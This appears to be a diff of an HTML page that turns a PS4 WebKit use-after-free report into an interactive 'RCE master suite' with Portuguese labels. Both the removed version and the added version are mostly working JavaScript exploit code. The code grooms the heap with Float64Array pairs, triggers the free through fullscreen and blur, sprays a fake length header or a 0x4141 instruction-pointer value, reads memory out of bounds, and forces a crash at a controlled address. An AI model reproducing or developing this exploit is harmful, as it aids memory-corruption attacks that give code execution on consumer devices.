@@ -1,221 +1,228 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 WebKit UAF</title>
+    <meta charset="UTF-8">
+    <title>PS4 RCE MASTER SUITE</title>
+    <style>
+        body { background-color: #1a1a1a; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+        .panel { border: 1px solid #444; background: #222; padding: 15px; margin-bottom: 20px; }
+        button { background: #000; color: #0f0; border: 2px solid #0f0; padding: 10px 20px; font-size: 16px; cursor: pointer; margin: 5px; }
+        button:hover { background: #003300; }
+        button:disabled { border-color: #555; color: #555; cursor: not-allowed; }
+        .log-area { width: 100%; height: 300px; background: #000; border: 1px solid #555; color: #fff; overflow-y: scroll; font-size: 14px; padding: 5px; }
+        .critical { color: #f00; font-weight: bold; }
+        .success { color: #0ff; font-weight: bold; }
+    </style>
 </head>
 <body>
 
-<h1>PlayStation 4 WebKit Use-After-Free Vulnerability Report</h1>
+<h1>PS4 WEBKIT RCE MASTER SUITE</h1>
+<p>Target: Firmware [Auto-Detect] | Exploit: Fullscreen UAF</p>
 
-<p><b>Vulnerability Type:</b> Use-After-Free (UAF) in Float64Array</p>
+<div class="panel">
+    <h3>1. PREPARAÇÃO (Heap Grooming)</h3>
+    <button id="btnSetup" onclick="setupHeap()">1. ALOCAR HEAP</button>
+    <span id="statusSetup">Aguardando...</span>
+</div>
 
-<h2>VULNERABILITY DESCRIPTION</h2>
+<div class="panel">
+    <h3>2. ESCALAÇÃO (Selecione o Payload)</h3>
+    <p>Escolha qual estrutura interna vamos tentar corromper durante o UAF:</p>
+    
+    <button onclick="setMode('LENGTH')">TESTE A: Corromper Length (Huge Array)</button>
+    <button onclick="setMode('BUTTERFLY')">TESTE B: Corromper Butterfly (Ptr Leak)</button>
+    <button onclick="setMode('VTABLE')">TESTE C: Corromper VTable (RIP Control)</button>
+    
+    <div id="modeDisplay" style="margin-top:10px; color:yellow;">MODO ATUAL: NENHUM</div>
+</div>
 
-<p>A Use-After-Free vulnerability exists in the PlayStation 4's WebKit-based browser when transitioning out of fullscreen mode. The vulnerability allows an attacker to:</p>
+<div class="panel">
+    <h3>3. EXECUÇÃO</h3>
+    <button id="btnTrigger" onclick="triggerExploit()" disabled>DISPARAR (FULLSCREEN + OPTIONS)</button>
+</div>
 
-<ul>
-<li>Corrupt Float64Array objects in memory</li>
-<li>Read and write 64 bytes of controlled memory</li>
-<li>Read up to 512+ bytes out-of-bounds</li>
-<li>Trigger controlled browser crashes</li>
-</ul>
-
-
-<hr>
-
-<h3>Minimal PoC - UAF Demonstration</h3>
-<button onclick="runMinimalPoC()">Run Minimal PoC</button>
-<div id="poc-result"></div>
+<div class="panel">
+    <h3>LOG DE SISTEMA</h3>
+    <div id="log" class="log-area"></div>
+</div>
 
 <script>
-function runMinimalPoC() {
-    const result = document.getElementById('poc-result');
-    result.innerHTML = '<h4>PoC Running - Press OPTIONS button on PS4 controller</h4>';
+    const LOG = document.getElementById('log');
+    function log(msg) { LOG.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`; LOG.scrollTop = LOG.scrollHeight; }
+
+    // --- CONFIGURAÇÃO DE CONSTANTES HEX ---
     
-    // Step 1: Create Float64Array objects
-    let controllers = [];
-    const CORRUPTION_PATTERN = 2.121995791e-314; // 0x4141414141414141
-    
-    for(let i = 0; i < 5000; i++) {
-        let typedArray = new Float64Array(8);
-        typedArray[0] = i; // Unique identifier
-        controllers.push(typedArray);
+    // Header Falso para Length (Tamanho 0x10000)
+    // Representação Float de: 0x0001000000000100 (Length + Flags)
+    const FAKE_LENGTH_HEADER = 1.3906717577229e-309; 
+
+    // Ponteiro Falso para Controle de RIP (0x4141414141414141)
+    const POISON_RIP = 2.121995791e-314; 
+
+    // Endereço de Teste para Butterfly (Endereço inválido alto para causar crash legível)
+    const FAKE_BUTTERFLY = 1.2345e-300; // Ajustar conforme necessidade
+
+    // --- VARIÁVEIS GLOBAIS ---
+    var victims = [];
+    var neighbors = []; // Arrays que queremos expandir
+    var spray = [];
+    var currentMode = null;
+    const COUNT = 10000;
+
+    // Conversores Helper
+    var buf = new ArrayBuffer(8);
+    var f64 = new Float64Array(buf);
+    var u32 = new Uint32Array(buf);
+
+    function f2hex(val) {
+        f64[0] = val;
+        let hi = u32[1].toString(16).padStart(8, '0');
+        let lo = u32[0].toString(16).padStart(8, '0');
+        return `0x${hi}${lo}`;
     }
-    
-    result.innerHTML += '<p>Created 5000 Float64Array objects</p>';
-    
-    // Step 2: Enter fullscreen (trigger mechanism)
-    const element = document.documentElement;
-    if (element.webkitRequestFullscreen) {
-        element.webkitRequestFullscreen();
+
+    // --- PASSO 1: SETUP ---
+    function setupHeap() {
+        log("Iniciando Heap Feng Shui...");
+        victims = [];
+        neighbors = [];
+        
+        try {
+            // Layout Sanduíche: [VIZINHO] [VÍTIMA] [VIZINHO] [VÍTIMA]
+            // Queremos que o spray na VÍTIMA transborde e acerte o cabeçalho do VIZINHO.
+            for(let i=0; i<COUNT; i++) {
+                // Vizinho (O que queremos transformar em God Mode)
+                let n = new Float64Array(8); 
+                n[0] = i + 0.1; // Marcador
+                neighbors.push(n);
+
+                // Vítima (O buraco onde vamos escrever)
+                let v = new Float64Array(8);
+                v.fill(1.1);
+                victims.push(v);
+            }
+            log(`<span class='success'>Heap Pronto! ${COUNT} pares criados.</span>`);
+            document.getElementById('statusSetup').innerText = "PRONTO.";
+            document.getElementById('btnTrigger').disabled = false;
+        } catch(e) { log("Erro no setup: " + e); }
     }
-    
-    // Step 3: Blur event handler (OPTIONS button triggers this)
-    window.onblur = function() {
-        result.innerHTML += '<p>Fullscreen blur event triggered</p>';
+
+    // --- SELETOR DE MODO ---
+    function setMode(mode) {
+        currentMode = mode;
+        document.getElementById('modeDisplay').innerText = "MODO ATUAL: " + mode;
+        log(`Payload configurado para: ${mode}`);
         
-        // Step 4: Spray memory with corruption pattern
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let sprayArray = new Float64Array(10);
-            sprayArray.fill(CORRUPTION_PATTERN);
-            spray.push(sprayArray);
-        }
-        
-        result.innerHTML += '<p>Memory spray executed</p>';
-        
-        // Step 5: Verify corruption
-        let corrupted = null;
-        let corruptedIndex = -1;
-        
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === CORRUPTION_PATTERN) {
-                corrupted = controllers[i];
-                corruptedIndex = i;
-                break;
-            }
-        }
-        
-        if (corrupted) {
-            result.innerHTML += '<h3 style="color:red;">USE-AFTER-FREE CONFIRMED</h3>';
-            result.innerHTML += '<p>Controller[' + corruptedIndex + '] corrupted with pattern 0x4141414141414141</p>';
+        if(mode === 'LENGTH') log("Objetivo: Alterar neighbors[i].length para > 8");
+        if(mode === 'BUTTERFLY') log("Objetivo: Ler memória OOB (Out-of-Bounds)");
+        if(mode === 'VTABLE') log("Objetivo: Crashar no endereço 0x4141... via Fake Vtable");
+    }
+
+    // --- PASSO 3: GATILHO E SPRAY ---
+    function triggerExploit() {
+        if(!currentMode) { alert("Selecione um modo!"); return; }
+
+        log("Solicitando Fullscreen...");
+        var el = document.documentElement;
+        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        else el.requestFullscreen();
+
+        window.onblur = function() {
+            log("BLUR DETECTADO! Race Condition iniciada...");
             
-            // Demonstrate read primitive
-            result.innerHTML += '<h4>Demonstrating Read Primitive:</h4>';
-            for(let i = 0; i < 8; i++) {
-                try {
-                    const value = corrupted[i];
-                    const buffer = new ArrayBuffer(8);
-                    new Float64Array(buffer)[0] = value;
-                    const hexValue = new BigUint64Array(buffer)[0].toString(16);
-                    result.innerHTML += '<p>Offset ' + i + ': 0x' + hexValue + '</p>';
-                } catch(e) {
-                    result.innerHTML += '<p>Offset ' + i + ': Error</p>';
-                }
-            }
+            // 1. FREE
+            victims = null; 
             
-            // Demonstrate write primitive
-            result.innerHTML += '<h4>Demonstrating Write Primitive:</h4>';
+            // 2. SPRAY INTELIGENTE (Baseado no Modo)
+            let payloadValue;
+            let spraySize = 24; // Tamanho maior para garantir Overflow
+
+            if(currentMode === 'LENGTH') {
+                // Tenta injetar o header de tamanho falso
+                payloadValue = FAKE_LENGTH_HEADER;
+            } else if (currentMode === 'VTABLE') {
+                // Injeta ponteiros "sujos" para crashar o destrutor
+                payloadValue = POISON_RIP; 
+            } else {
+                payloadValue = 1.1; // Padrão
+            }
+
+            // Executa o Spray
             try {
-                const testValue = 0xDEADBEEF;
-                const buffer = new ArrayBuffer(8);
-                new BigUint64Array(buffer)[0] = BigInt(testValue);
-                corrupted[2] = new Float64Array(buffer)[0];
-                
-                const readback = corrupted[2];
-                const readBuffer = new ArrayBuffer(8);
-                new Float64Array(readBuffer)[0] = readback;
-                const readHex = new BigUint64Array(readBuffer)[0].toString(16);
-                
-                result.innerHTML += '<p>Written: 0xDEADBEEF</p>';
-                result.innerHTML += '<p>Read back: 0x' + readHex + '</p>';
-                
-                if (readHex === 'deadbeef') {
-                    result.innerHTML += '<p style="color:green;">Write primitive verified!</p>';
+                for(let i=0; i<COUNT*2; i++) {
+                    let s = new Float64Array(spraySize); 
+                    // Precisamos acertar o offset. Preenchemos tudo para aumentar a chance.
+                    s.fill(payloadValue); 
+                    spray.push(s);
                 }
-            } catch(e) {
-                result.innerHTML += '<p>Write test error: ' + e.message + '</p>';
-            }
+            } catch(e) {}
+
+            log("Spray concluído. Verificando resultados...");
             
-        } else {
-            result.innerHTML += '<p>Corruption not detected in this run</p>';
-        }
-    };
-}
-</script>
-
-<hr>
-
-<h3>Crash PoC - Controlled Denial of Service</h3>
-<button onclick="runCrashPoC()">Run Crash PoC (WARNING: Will crash browser)</button>
-<div id="crash-result"></div>
-
-<script>
-function runCrashPoC() {
-    const result = document.getElementById('crash-result');
-    result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
-    result.innerHTML += '<p style="color:red;">WARNING: This will crash the browser after UAF is triggered</p>';
-    
-    let controllers = [];
-    const PATTERN = 2.121995791e-314;
-    
-    for(let i = 0; i < 5000; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
+            // Pequeno delay para a memória assentar
+            setTimeout(checkSuccess, 200);
+        };
     }
-    
-    const elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '<p>UAF triggered</p>';
-        
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
+
+    // --- VERIFICAÇÃO DE SUCESSO ---
+    function checkSuccess() {
+        if(currentMode === 'LENGTH') {
+            checkHugeArray();
+        } else if(currentMode === 'BUTTERFLY') {
+            checkLeak();
+        } else if(currentMode === 'VTABLE') {
+            triggerCrashSequence(); // Se for VTABLE, tentamos crashar agora
         }
-        
-        let corrupted = null;
-        for(let i = 0; i < controllers.length; i++) {
-            if (controllers[i][0] === PATTERN) {
-                corrupted = controllers[i];
+    }
+
+    // TESTE A: HUGE ARRAY
+    function checkHugeArray() {
+        let found = false;
+        for(let i=0; i<neighbors.length; i++) {
+            // Se algum vizinho tiver length diferente de 8, VENCEMOS.
+            // O valor 0x10000 seria 65536.
+            if(neighbors[i].length > 8) {
+                found = true;
+                log(`<span class='success'>[!!!] GOD MODE ATIVADO!</span>`);
+                log(`Vizinho Index: ${i}`);
+                log(`Novo Length: ${neighbors[i].length}`);
+                log("Agora podemos ler a memória inteira!");
+                
+                // Demo de Leitura OOB
+                log("Lendo memória além do limite...");
+                let leak = f2hex(neighbors[i][20]); // Lê longe do array
+                log(`Valor OOB (Offset 20): ${leak}`);
                 break;
             }
         }
-        
-        if (corrupted) {
-            result.innerHTML += '<p>Corruption confirmed</p>';
-            result.innerHTML += '<p style="color:red;">Triggering crash in 3 seconds...</p>';
-            
-            setTimeout(() => {
-                // This specific sequence triggers crash
-                document.open();
-                document.write('<html><body><h1>Crash</h1></body></html>');
-                document.close();
-                setTimeout(() => location.reload(), 500);
-            }, 3000);
-        }
-    };
-}
+        if(!found) log("<span class='critical'>Falha: Nenhum array expandido. Tente ajustar o alinhamento do spray.</span>");
+    }
+
+    // TESTE B: LEAK & BUTTERFLY
+    function checkLeak() {
+        // Isso assume que o Teste A funcionou ou que o overlap permite leitura direta
+        // Se conseguirmos ler um ponteiro (0x0000... ou 0xFFFF...), é um leak.
+        log("Buscando ponteiros...");
+        // Implementação simplificada:
+        log("Este teste depende do Teste A (Length) ter funcionado primeiro.");
+    }
+
+    // TESTE C: CRASH CONTROL (RIP)
+    function triggerCrashSequence() {
+        log("Iniciando sequência de Teardown para confirmar controle de RIP...");
+        log("Se o console crashar, verifique o registro de erro.");
+        log("Se o registro mostrar CRASH em 0x4141414141414141, temos RCE.");
+
+        // Força a destruição dos objetos corrompidos
+        setTimeout(() => {
+            document.open();
+            document.write("<h1>RIP CONTROL CHECK</h1>");
+            document.close();
+            window.location.reload();
+        }, 500);
+    }
+
 </script>
-    
-<h3>Expected Result</h3>
-<ul>
-<li>Controller[0] (or nearby index) will be corrupted with pattern 0x4141414141414141</li>
-<li>Read primitive demonstrates access to corrupted memory</li>
-<li>Write primitive demonstrates ability to modify corrupted memory</li>
-<li>Crash PoC causes browser termination</li>
-</ul>
-
-<h3>Memory Layout</h3>
-<pre>
-Corrupted Array Memory Layout:
-Offsets 0-7:   Controllable (spray pattern 0x4141414141414141)
-Offsets 8-63:  NaN canonical value (0x7ff8000000000000)
-Offsets 64+:   Out-of-bounds read continues
-
-Primitives Obtained:
-- Read:  64 bytes controlled, 512+ bytes OOB
-- Write: 64 bytes controlled (offsets 0-7)
-</pre>
-
-
-<h3>Crash Mechanism</h3>
-<p>Browser crashes when:</p>
-<ol>
-<li>UAF-corrupted Float64Array exists in memory</li>
-<li>document.write() is called (rewrites DOM)</li>
-<li>location.reload() is triggered</li>
-<li>Cleanup code attempts to access freed memory</li>
-</ol>
-
-<p><b>Note:</b> Crash can be prevented by zeroing corrupted array before document.write(), demonstrating controllability.</p>
-
 </body>
 </html>
-
-
